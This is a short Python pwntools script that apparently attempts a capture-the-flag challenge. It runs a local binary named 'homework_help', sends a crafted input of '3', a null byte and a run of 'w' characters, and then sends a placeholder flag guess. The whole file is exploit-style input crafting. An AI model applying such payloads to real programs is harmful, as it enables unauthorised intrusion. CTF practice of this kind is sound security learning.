from pwn import *
# using pwntools

p=process('./homework_help')
payload =b'3\x00' + b'wwwwwwwwwwwwwwwwwwwwwwwwwww'

p.sendline(payload)
resp = p.recv() 
print(resp)

p.sendline(b'FLAG_GUESS_HERE')
resp = p.recv() 
print(resp)
